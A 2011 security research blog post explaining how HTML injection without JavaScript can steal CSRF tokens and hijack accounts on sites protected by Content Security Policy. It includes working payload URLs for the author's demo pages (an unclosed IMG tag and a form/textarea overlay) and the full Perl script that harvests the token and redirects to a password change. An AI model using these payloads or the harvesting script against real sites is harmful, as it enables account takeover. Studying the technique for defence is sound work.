---
source: skeletonscribe-kettle
source_url: https://www.skeletonscribe.net/2011/05/js-less-xss.html
title: "Skeleton Scribe: JS-less XSS"
description: "Using HTML Injection to hijack accounts without JavaScript. Sometimes using javascript isn't an option. Maybe the target website uses the n..."
---

|     |     |     |     |
| --- | --- | --- | --- |
| [Go to Blogger.com](https://www.blogger.com/ "Go to Blogger.com") | |     |     |
| --- | --- |
|  |  | | MoreShare by emailShare with FacebookShare with TwitterReport Abuse | [Create Blog](https://www.blogger.com/onboarding) [Sign In](https://www.blogger.com/) |

# [Skeleton Scribe](http://skeletonscribe.net/)

## Saturday, 28 May 2011

### JS-less XSS

**Using HTML Injection to hijack accounts without JavaScript.**

Sometimes using javascript isn't an option. Maybe the target website uses the new [Content Security Policy (CSP)](https://developer.mozilla.org/en/Introducing_Content_Security_Policy) header to prevent script execution, or perhaps the target user has NoScript. At the moment CSP is extremely rare (only used by mobile Twitter and only supported by Firefox 4) but it may become widespread in the future. After all, with CSP " [the bar for a successful attack is placed much, much higher](http://blog.mozilla.com/security/2009/06/19/shutting-down-xss-with-content-security-policy/)" ;) The techniques here are not a CSP bypass, but a workaround.

Since I couldn't find an XSS in mobile twitter in 5 minutes, I've hashed together a couple of extremely simple demo pages that use CSP and are vulnerable to XSS. See if you can work out how to make a payload to hijack an account. If you aren't using FF4 just try to write a scriptless payload.

[Example Site One](http://albinowax.users.sourceforge.net/cgi-bin/one.pl)\-\-\---------------- [Exploit via IMG](http://albinowax.users.sourceforge.net/cgi-bin/one.pl?lang=%3Cimg%20src=%27http://albinowax.users.sourceforge.net/cgi-bin/jslessxss.pl?s=)

This exploit is quite stealthy; unless you intercept your browser's requests, you might not realise the password has been changed. The injected unclosed IMG tag results in the victim's browser making a request like GET http://albinowax.users.sourceforge.net/cgi-bin/jslessxss.pl?s=\[theEntirePageAfterTheInjectionPoint\]

jslessxss.pl extracts the 'csrftoken' value from the GET request, and places it into a 302 Found response like:

302 Found

Location: http://albinowax.users.sourceforge.net/cgi-bin/one.pl?pass1=evilpassword&pass2=evilpassword&csrftoken=\[token\]

So your browser dutifully performs

GET http://albinowax.users.sourceforge.net/cgi-bin/one.pl?pass1=evilpassword&pass2=evilpassword&csrftoken=\[token\]

And that's it; the page will see the correct token and update the password.

The code behind jslessxss.pl is very simple:

> #!/usr/bin/perl
>
> use CGI ':standard';
>
> my $tok = param('s');
>
> if($tok =~ m/csrftoken.\*value="(\[0-9\]\*)/) { $tok = $1; } #extract the token
>
> my $ref = $ENV{HTTP\_REFERER}; #get the referer
>
> $ref =~ s/\\?.\*//g; #remove any arguments from the referer
>
> print header(-Status=>'302 Found', -Location=>$ref.'?pass1=evilpassword&pass2=evilpassword&csrftoken='.$tok);

If the request you want to forge is POST only, try <iframe src='http://example.com?s= to grab the token instead, and put an autosubmitting form in the iframe'd page.

[Example Site Two](http://albinowax.users.sourceforge.net/cgi-bin/two.pl)\-\-\---------------- [Exploit via FORM/TEXTBOX](http://albinowax.users.sourceforge.net/cgi-bin/two.pl?lang=%3Cform%20method=POST%20action=%27http://albinowax.users.sourceforge.net/cgi-bin/jslessxss.pl?%27%3E%20%3C/div%3E%3C/div%3E%3CINPUT%20name=%27submit%27%20TYPE=%27submit%27%20VALUE=%27clickme%27%20style=%27position:absolute%3bwidth:2000px%3btop:0px%3bleft:0px%3bright:0px%3bbottom:0px%27%3E%3Ctextarea%20name=%27s%27%3E%3C%21--)

This exploit is a lot less subtle. It requires user interaction, and triggers NoScript's XSS filter. However, the <form> <textbox> approach is much more likely to capture the whole web page, and won't be upset by a single ' or ".

The demo doesn't show it, but a token harvested from one page can often be used for any form on the website, and re-used indefinitely. Thus, just like with normal XSS, the injection doesn't have to be on the page with the form you want to forge. Another interesting alternative to harvesting tokens is UI-redressing attacks like clickjacking, since many anti-framing techniques allow framing when the host domain matches the framed domain.

Finally, I'm sure there are plenty more entertaining and robust ways of hijacking accounts without javascript/flash/java. I'll try to keep this page updated with the latest.

**See also:**

Sniffing saved passwords (still works):

[http://kuza55.blogspot.co.uk/2007/02/breaking-firefoxs-rcsr-fix.html](http://kuza55.blogspot.co.uk/2007/02/breaking-firefoxs-rcsr-fix.html)

[http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)

[http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)

[http://www.slideshare.net/x00mario/stealing-the-pie](http://www.slideshare.net/x00mario/stealing-the-pie)

Posted by
[James Kettle](https://www.blogger.com/profile/03270155456684307605 "author profile")
at
[01:40](https://www.skeletonscribe.net/2011/05/js-less-xss.html "permanent link")

[Email This](https://www.blogger.com/share-post.g?blogID=8601133831815091251&postID=5096747841698878502&target=email "Email This") [BlogThis!](https://www.blogger.com/share-post.g?blogID=8601133831815091251&postID=5096747841698878502&target=blog "BlogThis!") [Share to X](https://www.blogger.com/share-post.g?blogID=8601133831815091251&postID=5096747841698878502&target=twitter "Share to X") [Share to Facebook](https://www.blogger.com/share-post.g?blogID=8601133831815091251&postID=5096747841698878502&target=facebook "Share to Facebook") [Share to Pinterest](https://www.blogger.com/share-post.g?blogID=8601133831815091251&postID=5096747841698878502&target=pinterest "Share to Pinterest")

Labels:
[bypass XSS CSRF CSP Content-security-policy](https://www.skeletonscribe.net/search/label/bypass%20XSS%20CSRF%20CSP%20Content-security-policy)

#### No comments:

#### Post a Comment

Post a comment

Comment with your Google Account if you’d like to be able to manage your comments in the future. If you comment anonymously, you won’t be able to edit or delete your comment. [Learn more](https://www.blogger.com/go/anonymouscommentshelp)

![User Avatar](https://resources.blogblog.com/img/anon36.png)

Comment as:

Select profile:

Google Account

Anonymous

Name/URL



Edit

Enter comment

Publish

This site is protected by reCAPTCHA and the Google [privacy policy](https://policies.google.com/privacy) and [Terms of Service](https://policies.google.com/terms) apply.

[Newer Post](https://www.skeletonscribe.net/2011/07/sparse-bruteforce-addon-scanner.html "Newer Post")[Older Post](https://www.skeletonscribe.net/2011/05/simulating-targets-for-xsscsrf-attacks.html "Older Post")[Home](https://www.skeletonscribe.net/)

Subscribe to:
[Post Comments (Atom)](https://www.skeletonscribe.net/feeds/5096747841698878502/comments/default)

**Who**

- [James Kettle](http://skeletonscribe.net/)

**Contact**

- [@albinowax](https://twitter.com/albinowax)
- xawonibla@gmail.com (personal)

- elttek.semaj@portswigger.net (work)

- albinowax on [freenode](https://webchat.freenode.net/?randomnick=0&channels=#slackers)

## Quality content

- [magic mac's blog](https://www.brokenbrowser.com/)
- [lcamtuf's blog](http://lcamtuf.blogspot.co.uk/)
- [.mario's slides](http://www.slideshare.net/x00mario/presentations)
- [sirdarckcat's blog](https://sirdarckcat.blogspot.co.uk/)
- [irsdl's blog](https://soroush.secproject.com/blog/)
- [Gareth Heyes' blog](http://www.thespanner.co.uk/)
- [kuza's blog](http://kuza55.blogspot.co.uk/)
- [Shared Fuzzer](http://shazzer.co.uk/)
- [HTML5 Security Cheat Sheet](http://html5sec.org/)
- [unexpected theology](http://davidkettle.org.uk/)

## Archive

- [Practical HTTP Host header attacks](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html)
- [Phrack ebook](https://www.skeletonscribe.net/2011/12/phrack-ebook.html)
- [Reviewing bug bounties - a hacker's perspective](https://www.skeletonscribe.net/2016/08/reviewing-bug-bounties-hackers.html)
- [h1-212 CTF Writeup](https://www.skeletonscribe.net/2017/11/h1-212-ctf-writeup.html)
- [Abusing OWASP with 'Insufficient Attack Protection'](https://www.skeletonscribe.net/2017/04/abusing-owasp.html)
- [X-Frame-Options gotcha](https://www.skeletonscribe.net/2012/06/x-frame-options-sameorigin-warning.html)
- [Hackxor hacking game beta](https://www.skeletonscribe.net/2011/02/hackxor-hacking-game-beta.html)
- [Simulating targets for XSS/CSRF attacks in hacking games](https://www.skeletonscribe.net/2011/05/simulating-targets-for-xsscsrf-attacks.html)
- [Sparse Bruteforce Addon Detection](https://www.skeletonscribe.net/2011/07/sparse-bruteforce-addon-scanner.html)
- [Chronofeit Phishing](https://www.skeletonscribe.net/2010/12/chronofeit-phishing.html)

|     |     |
| --- | --- |
|  |  |

|     |     |
| --- | --- |
|  |  |

Powered by [Blogger](https://www.blogger.com/).